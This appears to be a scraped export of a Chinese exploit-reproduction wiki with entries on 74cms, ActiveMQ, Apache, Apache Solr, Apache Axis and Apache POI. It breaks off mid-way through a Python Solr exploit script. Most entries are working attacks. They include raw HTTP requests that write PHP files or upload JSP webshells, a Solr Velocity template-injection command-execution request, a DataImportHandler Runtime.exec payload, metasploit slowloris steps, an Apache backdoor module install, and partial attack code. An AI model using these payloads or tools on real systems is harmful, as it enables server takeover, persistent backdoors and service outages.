可控制的情况下大部分都是有注入问题的，所以这里我基本可以通过经验确定，只要带入了进行查询那就是一个注入漏洞。 这里的构造方法知道这些即可，其他的都不是很重要这里我们打印一下，最终处理的内容好了知道这些前置条件以后我们继续。 在执行完这个构造函数以后，还会自动的执行run() 方法 0x05 修复方法 $this->field = \"id,ROUND(6378.138*2*ASIN(SQRT(POW(SIN((\".floatval($this->params['lat']).\"*PI()/180-map_y*PI()/180)/2),2)+COS(\".floatval($this->params['lat']).\"*PI()/180)*COS(map_y*PI()/180)*POW(SIN((\".floatval($this->params['lng']).\"*PI()/180-map_x*PI()/180)/2),2)))*1000) AS map_range\"; 强转为浮点型，防止注入 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/iwgmb2 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 10:57:06 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html":{"url":"0day/74cms/新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞.html","title":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞","keywords":"","body":"74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 突突突突突突突 文件： 74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php 方法：members_edit( 从这里看漏洞整体都很简单。没有过多的套路的，有的只是中规中矩。 那么就让我们直接利用试试。 先看看数据库现在的数据 接着让我们来调接口看看 文件： 74cms\\upload\\Application\\Home\\Controller\\ApiController.class.php 方法：check_token( 接口调用失败的原因是因为，上图的析构函数 调用了方法 check_token 进行了token验证 这些都没有问题， $token 也是我们可以操控的。 现在的问题就是C('PWDHASH') 我们现在无法得到。 好在，我们还可以通过组合漏洞的形式来获取。 想要利用此漏洞，我的想法是先通过，任意读取漏洞，先把C('PWDHASH') 的值读取出来，然后在加密验证一下即可 而加密的代码其实我们不需要去看，因为这是全局通用的代码，所以我们正式环境中复制出来加密一下就可以利用了。 思路： 先下载此源码然后本地把此加密函数保存下来即可。（因为没人会没事去改加密函数） 然后在通过 “任意文件读取漏洞” 读取目标站点的C('PWDHASH') 的值，接着本地加密成token 这样漏洞就可以使用了 任意文件读取的小脚本下载 https://github.com/ianxtianxt/74cms_file_read 下载此文件以后 设置成这样，然后执行一下 接着把 PWDHASH 复制出来 我们这里看看加密的代码： 文件：74cms\\upload\\Application\\Common\\Common\\function.php 函数：encrypt( 然后加密一下 这时你就会发现虽然我们密码改了但是不知道用户名怎么办？ 好在我们可以这样利用！ 人家登录是可以用户名，手机号登录的，所以我们就 当然如果你要修改用户名登录的话，也可以，看你自己喜欢了 0x03 利用小工具 为了方便大家，手工做这种事情是很累的，所以还是要写个小工具，可以方便的去利用。 利用工具: https://github.com/ianxtianxt/74cms_file_read 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/rymscc 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 10:57:11 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/1.html":{"url":"0day/74cms/1.html","title":"74cms v5.0.1远程执行代码","keywords":"","body":"74cms v5.0.1远程执行代码 一、漏洞简介 二、漏洞影响 74cms v5.0.1 三、复现过程 漏洞分析 POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 391 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain=127.0.0.1&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= c=config&a=edit -> Controller=config&action=edit -> /Application/Admin/Controller/ConfigController.class.php Line 9: I('request.site_domain','','trim') -> trim($site_domain,'/') -> '.'.implode('.',$domain) -> array('domain'=>$domain) -> $this->update_config($config,CONF_PATH.'url.php') public function edit(){ if(IS_POST){ $site_domain = I('request.site_domain','','trim'); $site_domain = trim($site_domain,'/'); $site_dir = I('request.site_dir',C('qscms_site_dir'),'trim'); $site_dir = $site_dir==''?'/':$site_dir; $site_dir = $site_dir=='/'?$site_dir:('/'.trim($site_dir,'/').'/'); $_POST['site_dir'] = $site_dir; if($site_domain && $site_domain != C('qscms_site_domain')){ if($site_domain == C('qscms_wap_domain')){ $this->returnMsg(0,'主域名不能与触屏版域名重复！'); } $str = str_replace('http://','',$site_domain); $str = str_replace('https://','',$str); if(preg_match('/com.cn|net.cn|gov.cn|org.cn$/',$str) === 1){ $domain = array_slice(explode('.', $str), -3, 3); }else{ $domain = array_slice(explode('.', $str), -2, 2); } $domain = '.'.implode('.',$domain); $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); } /ThinkPHP/Common/functions.php第271行中的I（'request.sitedomain'，''，'trim'）是字符串。request.site_domain-> $ _REQUEST ['site_domain']-> $ REQUEST ['site_domain']是字符串->修剪（$ _REQUEST ['site_domain']） function I($name,$default='',$filter=null,$datas=null) { ... if(strpos($name,'.')) { // 指定参数来源 list($method,$name) = explode('.',$name,2); }else{ // 默认为自动判断 $method = 'param'; } switch(strtolower($method)) { case 'get' : $input =& $_GET; break; case 'post' : $input =& $_POST; break; ... case 'request' : $input =& $_REQUEST; break; ... } if(''==$name) { // 获取全部变量 ... } }elseif(isset($input[$name])) { // 取值操作 $data = $input[$name]; $filters = isset($filter) ? $filter.','.C('DEFAULT_FILTER') : C('DEFAULT_FILTER'); //$filters = isset($filter)?$filter:C('DEFAULT_FILTER'); if($filters) { if(is_string($filters)){ if(0 === strpos($filters,'/')){ if(1 !== preg_match($filters,(string)$data)){ // 支持正则验证 return isset($default) ? $default : null; } }else{ $filters = explode(',',$filters); } }elseif(is_int($filters)){ $filters = array($filters); } if(is_array($filters)){ foreach($filters as $filter){ if(function_exists($filter)) { $data = is_array($data) ? array_map_recursive($filter,$data) : $filter($data); // 参数过滤 }else{ $data = filter_var($data,is_int($filter) ? $filter : filter_id($filter)); if(false === $data) { return isset($default) ? $default : null; } } } } } if(!empty($type)){ ... }else{ // 变量默认值 $data = isset($default)?$default:null; } is_array($data) && array_walk_recursive($data,'think_filter'); return $data; } 返回到/Application/Admin/Controller/ConfigController.class.php第29行：array（'SESSION_OPTIONS'=> array（'domain'=> $ domain），'COOKIE_DOMAIN'=> $ domain） -> update_config（$ config， CONF_PATH.'url.php'） $config['SESSION_OPTIONS'] = array('domain'=>$domain); $config['COOKIE_DOMAIN'] = $domain; $this->update_config($config,CONF_PATH.'url.php'); /Application/Common/Controller/BackendController.class.php第467 行中的update_config（$ config，CONF_PATH.'url.php'）： multimerge（$ config，$ new_config） -> file_put_contents（$ config_file，“ public function update_config($new_config, $config_file = '') { !is_file($config_file) && $config_file = HOME_CONFIG_PATH . 'config.php'; if (is_writable($config_file)) { $config = require $config_file; $config = multimerge($config, $new_config); if($config['SESSION_OPTIONS']){ $config['SESSION_OPTIONS']['path'] = SESSION_PATH; } file_put_contents($config_file, \"multimerge($config, $new_config) in /Application/Common/Common/function.php Line 938: no restricted function multimerge($a, $b) { if (is_array($b) && count($b)) { foreach ($b as $k => $v) { if (is_array($v) && count($v)) { $a[$k] = in_array($k, array('SESSION_OPTIONS')) ? multimerge($a[$k], $v) : $v; } else { $a[$k] = $v; } } } else { $a = $b; } return $a; } CONF_PATH in /ThinkPHP/ThinkPHP.php Line 54: CONF_PATH.'url.php' -> /Application/Common/Conf/url.php defined('COMMON_PATH') or define('COMMON_PATH', APP_PATH.'Common/'); // 应用公共目录 defined('CONF_PATH') or define('CONF_PATH', COMMON_PATH.'Conf/'); define('APP_PATH','./Application/'); var_export(): Quote string with slashes&Convert special characters to HTML entities -> stripslashes(): un-quotes a quoted string -> Convert special characters to HTML entities -> write file file_put_contents($config_file, \"/Application/Home/Conf/url.php: The code after \"return array(...);\" does not work, so payload is site_domain=', {your php code},' 0, 'URL_HTML_SUFFIX' => '.html', 'URL_PATHINFO_DEPR' => '/', 'URL_ROUTER_ON' => true, 'URL_ROUTE_RULES' => array ( '/^jobfair\\/(?!admin)(\\w+)$/' => 'jobfair/index/:1', '/^mall\\/(?!admin)(\\w+)$/' => 'mall/index/:1', ), 'QSCMS_VERSION' => '5.0.1', 'QSCMS_RELEASE' => '2019-03-19 00:00:00', 'SESSION_OPTIONS' => array ( 'domain' => '.0.1', 0 => 18, 1 => '', 'path' => 'D:\\***\\***\\***\\WWW\\74cms\\data\\session', ), 'COOKIE_DOMAIN' => '.0.1', 0 => 18, 1 => '', ); 复现poc -> PD9waHAgcGhwaW5mbygpOz8+ site_domain=', file_put_contents('403.php',base64_decode('PD9waHAgcGhwaW5mbygpOz8+')),' POST /74cms/index.php?m=Admin&c=config&a=edit HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: http://127.0.0.1/74cms/index.php?m=Admin&c=Config&a=index Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 465 Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default site_name=%E9%AA%91%E5%A3%AB%E4%BA%BA%E6%89%8D%E7%B3%BB%E7%BB%9F&site_domain='%2C+file_put_contents('403.php'%2Cbase64_decode('PD9waHAgcGhwaW5mbygpOz8%2B'))%2C'&site_dir=%2F74cms%2F&top_tel=000-00000000&bootom_tel=000-00000000&contact_email=&address=00%E7%9C%8100%E5%B8%8200%E8%B7%AF00%E5%8F%B70%E5%A4%A7%E5%8E%A600%E6%A5%BC&bottom_other=Copyright+%C2%A9+2019+74cms.com+All+Right+Reserved+&icp=icp000000000&isclose=0&close_reason=&statistics=&logo_home=&logo_other= GET /74cms/Application/Common/Conf/url.php HTTP/1.1 Host: 127.0.0.1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Connection: close Cookie: PHPSESSID=arm0lvlbbfocml5vvac1tf3ph3; think_language=zh-CN; think_template=default Upgrade-Insecure-Requests: 1 Cache-Control: max-age=0 成功截图 四、参考链接 https://github.com/kyrie403/Vuln/blob/master/74cms/74cms%20v5.0.1%20remote%20code%20execution.md 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 11:05:43 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/2.html":{"url":"0day/ActiveMQ/2.html","title":"ActiveMQ物理路径泄漏漏洞","keywords":"","body":"ActiveMQ物理路径泄漏漏洞 一、漏洞简介 ActiveMQ默认开启PUT请求，当开启PUT时，构造好Payload(即不存在的目录)，Response会返回相应的物理路径信息 二、漏洞影响 三、复现过程 Request Raw: PUT /fileserver/a../../%08/..%08/.%08/%08 HTTP/1.1 Host: 192.168.197.25:8161 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 4 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 22:11:34 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/1.html":{"url":"0day/ActiveMQ/1.html","title":"（CVE-2016-3088）ActiveMQ应用漏洞","keywords":"","body":"（CVE-2016-3088）ActiveMQ应用漏洞 一、漏洞简介 ActiveMQ是一款流行的开源消息服务器。默认情况下，ActiveMQ服务是没有配置安全参数。恶意人员可以利用默认配置弱点发动远程命令执行攻击，获取服务器权限，从而导致数据泄露。 二、漏洞影响 Apache ActiveMQ 5.x ~ 5.14.0 三、复现过程 漏洞是需要登录之后才可以执行 漏洞利用就是/fileserver/有put上传权限，/admin/有执行权限，可找到绝对路径，使用move移动文件到/admin/ 下面就是两步走，先是利用put上传文件到/fileserver/,然后移动到move到admin下面 所有返回为204就代表是成功，有个坑点：不要put同文件名的文件上去 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ 如果上传不解析的话，则是证明没有权限！！！ ActiveMQ默认开启PUT方法，当fileserver存在时我们可以上传jspwebshell。 PUT /fileserver/shell.jsp HTTP/1.1 Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= shell 利用 MOVE 方法将 Webshell 移入 admin/ 目录 Request Raw: MOVE /fileserver/shell.jsp HTTP/1.1 Destination:file:/data/apache-activemq-5.7.0/webapps/admin/shell.jsp Host: 192.168.197.25:8161 User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Connection: keep-alive Upgrade-Insecure-Requests: 1 Authorization: Basic YWRtaW46YWRtaW4= Content-Length: 17 Content-Length: 0 shell 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-28 11:39:24 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/ActiveMQ/3.html":{"url":"0day/ActiveMQ/3.html","title":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞","keywords":"","body":"（CVE-2017-15709）ActiveMQ 信息泄漏漏洞 一、漏洞简介 Apache ActiveMQ默认消息队列61616端口对外，61616端口使用了OpenWire协议，这个端口会暴露服务器相关信息，这些相关信息实际上是debug信息。 会返回应用名称，JVM，操作系统以及内核版本等信息。 二、漏洞影响 apache-activemq-5.15.0 to apache-activemq-5.15.2 apache-activemq-5.14.0 to apache-activemq-5.14.5 三、复现过程 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-06 22:16:04 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/1.html":{"url":"0day/Apache/1.html","title":"（CVE-2007-6750）Apache ddos","keywords":"","body":"（CVE-2007-6750）Apache ddos 一、漏洞简介 Apache HTTP服务器1.x和2.x允许远程攻击者通过部分HTTP请求导致拒绝服务(守护进程中断)，如Slowloris所示，这与2.2.15之前版本中缺少mod_ReqTimeout模块有关 二、漏洞影响 Apache 1.x/2.x 三、复现过程 nmap -sV -p80 192.168.146.175(用nmap查看Apache版本)(Apache2.2.3初步断定存在漏洞) 接着访问网站查看是否正常(发现网站正常) msfconsole(启动metasploit) use auxiliary/dos/http/slowloris(使用模块) set RHOST 192.168.146.175(设置目标IP) run(执行攻击) 再访问网站查看是否正常(发现网站瘫痪) 四、参考链接 https://www.jsxlo.com/cve-2007-6750/ 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-14 14:31:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/CVE-2017-15715.html":{"url":"0day/Apache/CVE-2017-15715.html","title":"（CVE-2017-15715）Apache解析漏洞","keywords":"","body":"（CVE-2017-15715）Apache解析漏洞 一、漏洞简介 二、漏洞影响 Apache 2.4.0到2.4.29 三、复现过程 首先正常上传一个图片，发现无法上传 如果文件名取自$_FILES['file']['name']，就会自动把换行符去掉，而文件名取自post参数name中，就能很好的利用到这个解析漏洞 下面我们上传一个包含换行符的文件，这里需要注意只能时\\x0a而不是\\x0d\\x0a，\\x0d\\x0a的情况是我们直接添加一个换行符，我们利用burp的hex功能在test666.php后面添加一个\\x0a 从响应包中可以看到上传成功了，但是相应页面success.html中并没有告诉我们上传文件的目录 但是我们在请求包中还可以看到一个参数dir = /upload/，所以猜测上传目录为·/upload/test666.php%0a 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 01:15:02 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/6.html":{"url":"0day/Apache/6.html","title":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞","keywords":"","body":"（CVE-2019-0193）Apache Solr 远程命令执行漏洞 一、漏洞简介 Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。 二、漏洞影响 三、复现过程 如上图所示，首先打开刚刚创建好的test核心，选择Dataimport功能并选择debug模式，填入以下POC： 点击Execute with this Confuguration会发送以下请求包： POST /solr/test/dataimport?_=1565835261600&indent=on&wt=json HTTP/1.1 Host: localhost:8983 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0 Accept: application/json, text/plain, */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Content-type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest Content-Length: 679 Connection: close Referer: http://localhost:8983/solr/ Cookie: csrftoken=gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid=snzojzqa5zn187oghf06z6xodulpohpr command=full-import&verbose=false&clean=false&commit=true&debug=true&core=test&dataConfig=%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&name=dataimport 执行docker-compose exec solr ls /tmp，可见/tmp/success已成功创建： 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-20 17:02:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/2.html":{"url":"0day/Apache/2.html","title":"（CVE-2019-0227）Apache Axis 1.4远程代码执行","keywords":"","body":"（CVE-2019-0227）Apache Axis 1.4远程代码执行 一、漏洞简介 Apache Axis™是一个简单对象访问协议（SOAP）引擎。在最近的一次红队行动中，我们发现目标装有老版本的Apache Axis（1.4）。现在较新的有Apache Axis2, Apache CXF,和Metro等。尽管Apache Axis已经过时，但它仍然在许多情况下被使用，例如使用Axis构造的项目难以重写或者项目中含有使用SOAP编码的服务。 我们的目标仍在使用过时的版本，因此我们觉得值得深入挖掘，看看是否有可利用的漏洞。最后，我们找到了一个RCE漏洞，该漏洞是由于在默认的示例中使用了过期的硬编码域名作为默认安装。Apache官方为该漏洞签署编号：CVE-2019-0227。现在，我们已经购买了过期域名（www.xmltoday.com）从而防止该漏洞被恶意利用。在本文中，我们将在本地环境中（无需域名）为你演示这个漏洞，同时这个漏洞对Axis2也有影响。 Axis 如果你在服务器的Apache Axis或Axis2的找到服务端请求伪造（SSRF）漏洞，你也可能实现目标服务器的代码执行。在Ambionics Security的博客文章中有类似的介绍。因为涉及到产权保护，我不会介绍那篇文章的太多细节，总而言之：Axis以管理员权限处理localhost的请求，攻击者可以通过SSRF漏洞修改HTTP GET请求部分来伪装成localhost用户。 二、漏洞影响 Apache Axis版本= 1.4 三、复现过程 https://github.com/ianxtianxt/cve-2019-0227 1、需要在msf设置监听，另外需要修改代码24-30行处 ＃您需要更改这些变量以匹配您的配置 myip = “ 192.168.0.117 ” ＃您机器的IP target = “ 192.168.0.102 ” ＃目标IP 网关= “ 192.168.0.1 ” ＃默认网关 targetport = “ 8080 ” ＃目标运行轴的端口（可能是8080） pathtoaxis = “ http://192.168.0.102:8080/axis ” ＃这可以是自定义的视轴安装，但是这是默认 spoofinterface = “ eth0 ” ＃伪造的接口 jspwritepath = “ webapps \\\\ axis \\\\ exploit.jsp ” ＃在目标上写入JSP有效负载的相对路径这是Tomcat安装的默认路径 2、然后执行py文件 等待返回shell 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/3.html":{"url":"0day/Apache/3.html","title":"（CVE-2019-12415）Apache POI <= 4.1.0 XXE漏洞","keywords":"","body":"（CVE-2019-12415）Apache POI 一、漏洞简介 什么是POI Apache POI是Apache软件基金会的开放源码函式库，POI提供API给Java程序对Microsoft Office格式档案读和写的功能。 关于CVE-2019-12415 这是最近的POI官方宣布出来的一个XXE漏洞，可以影响到4.1.0版本，官方已在十天前更新了4.1.1版本，最新版本修复了这个XXE漏洞。 在最高4.1.0的Apache POI中，当使用工具XSSFExportToXml转换用户提供的Microsoft Excel文档时，特制文档可允许攻击者通过XML外部实体（XXE）从本地文件系统或内部网络资源中读取文件。加工中。 根据官方介绍，防御是在使用 XSSFExportToXml类xlsx转xml时触发的。 diff了一下4.1.0和4.1.1 XSSFExportToXml类的原始代码，发现在isValid方法里多设置了一个功能。 问题就出在 XSSFExportToXml#isValid 方法里，如果 XSSFExportToXml#exportToXML方法的第三个参数为true逐步进入 isValid触发XXE。 二、漏洞影响 Apache POI 三、复现过程 XSSFWorkbook wb = new XSSFWorkbook(new FileInputStream(new File(\"CustomXMLMappings.xlsx\"))); for (XSSFMap map : wb.getCustomXMLMappings()) { XSSFExportToXml exporter = new XSSFExportToXml(map); // 使用 XSSFExportToXml 将 xlsx 转成 xml exporter.exportToXML(System.out, true);//第一个参数是输出流无所谓，第二个参数要为 true} 然后下载这个xlsx文件。 https://github.com/apache/poi/raw/f509d1deae86866ed531f10f2eba7db17e098473/test-data/spreadsheet/CustomXMLMappings.xlsx 把文件替换为“ CustomXMLMappings.zip”并解压文件。 编辑 CustomXMLMappings/xl/xmlMaps.xml 文件。 在 标签里面加上一行代码。 然后把xlsx释放出来的所有文件再用zip打包回去，改成 CustomXMLMappings.xlsx。 最后一步监听本地8080端口，运行POC。 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/4.html":{"url":"0day/Apache/4.html","title":"Apache后门维持","keywords":"","body":"Apache后门维持 一、漏洞简介 通过运行第三方脚本，实现维持后门的方法 二、漏洞影响 三、复现过程 https://github.com/ianxtianxt/apache- 1、上传 mod_backdoor.c到服务器，并执行命令 apxs -i -a -c mod_backdoor.c && service apache2 restart 2、控制端执行方法 python exploit.py 127.0.0.1 80 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/5.html":{"url":"0day/Apache/5.html","title":"Apache Solr Velocity模版注入远程命令执行","keywords":"","body":"Apache Solr Velocity模版注入远程命令执行 一、漏洞简介 该漏洞的产生是由于两方面的原因： 1、当攻击者可以直接访问Solr控制台时，可以通过发送类似/节点名/config的POST请求对该节点的配置文件做更改。 2、2Apache Solr默认集成VelocityResponseWriter插件，在该插件的初始化参数中的params.resource.loader.enabled这个选项是用来控制是否允许参数资源加载器在Solr请求参数中指定模版，默认设置是false。 当设置params.resource.loader.enabled为true时，将允许用户通过设置请求中的参数来指定相关资源的加载，这也就意味着攻击者可以通过构造一个具有威胁的攻击请求，在服务器上进行命令执行。 二、漏洞影响 经过测试，目前影响Apache Solr 8.1.1到8.2.0版本。 推测影响全版本Apache Solr。 三、复现过程 手动检测 手动检测访问http://www.0-sec.org/8983/solr/#/进入主界面，单击左侧的Core Selector查看集合名称 1、post发送请求 POST /solr/test/config HTTP/1.1 Host: solr:8983 Content-Type: application/json Content-Length: 259 { \"update-queryresponsewriter\": { \"startup\": \"lazy\", \"name\": \"velocity\", \"class\": \"solr.VelocityResponseWriter\", \"template.base.dir\": \"\", \"solr.resource.loader.enabled\": \"true\", \"params.resource.loader.enabled\": \"true\" } } 2、执行系统命令 GET /solr/test/select?q=1&&wt=velocity&v.template=custom&v.template.custom=%23set($x=%27%27)+%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+%23set($chr=$x.class.forName(%27java.lang.Character%27))+%23set($str=$x.class.forName(%27java.lang.String%27))+%23set($ex=$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end HTTP/1.1 Host: localhost:8983 使用脚本检测 auth: @l3_W0ng version: 1.0 function: Apache Solr RCE via Velocity template usage: python3 script.py ip [port [command]] default port=8983 default command=whoami note: Step1: Init Apache Solr Configuration Step2: Remote Exec in Every Solr Node \"\"\" import sys import json import time import requests class initSolr(object): timestamp_s = str(time.time()).split('.') timestamp = timestamp_s[0] + timestamp_s[1][0:-3] def __init__(self, ip, port): self.ip = ip self.port = port def get_nodes(self): payload = { '_': self.timestamp, 'indexInfo': 'false', 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/cores' try: nodes_info = requests.get(url, params=payload, timeout=5) node = list(nodes_info.json()['status'].keys()) state = 1 except: node = '' state = 0 if node: return { 'node': node, 'state': state, 'msg': 'Get Nodes Successfully' } else: return { 'node': None, 'state': state, 'msg': 'Get Nodes Failed' } def get_system(self): payload = { '_': self.timestamp, 'wt': 'json' } url = 'http://' + self.ip + ':' + self.port + '/solr/admin/info/system' try: system_info = requests.get(url=url, params=payload, timeout=5) os_name = system_info.json()['system']['name'] os_uname = system_info.json()['system']['uname'] os_version = system_info.json()['system']['version'] state = 1 except: os_name = '' os_uname = '' os_version = '' state = 0 return { 'system': { 'name': os_name, 'uname': os_uname, 'version': os_version, 'state': state } } class apacheSolrRCE(object): def __init__(self, ip, port, node, command): self.ip = ip self.port = port self.node = node self.command = command self.url = \"http://\" + self.ip + ':' + self.port + '/solr/' + self.node def init_node_config(self): url = self.url + '/config' payload = { 'update-queryresponsewriter': { 'startup': 'lazy', 'name': 'velocity', 'class': 'solr.VelocityResponseWriter', 'template.base.dir': '', 'solr.resource.loader.enabled': 'true', 'params.resource.loader.enabled': 'true' } } try: res = requests.post(url=url, data=json.dumps(payload), timeout=5) if res.status_code == 200: return { 'init': 'Init node config successfully', 'state': 1 } else: return { 'init': 'Init node config failed', 